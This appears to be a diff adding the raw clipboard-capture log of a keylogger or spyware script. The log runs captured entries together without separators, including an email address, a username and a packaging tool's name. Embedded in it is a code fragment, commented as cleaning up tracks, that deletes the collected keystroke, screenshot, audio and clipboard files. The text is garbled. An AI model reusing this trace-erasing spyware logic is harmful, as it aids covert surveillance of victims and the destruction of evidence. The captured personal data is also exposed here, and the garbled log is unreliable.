@@ -1,0 +1,11 @@
+Clipboard could be not be copiedClipboard could be not be copiedClipboard Data: 
+# Clean up our tracks and delete files
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)Clipboard could be not be copiedClipboard Data: 
+codingtest0110Clipboard Data: 
+codingtest0110@gmail.comClipboard Data: 
+codingtest0110@gmail.comClipboard Data: 
+codingtest0110@gmail.comClipboard Data: 
+auto-py-to-exeClipboard Data: 
+https://youtu.be/c-XpTMGPQvI
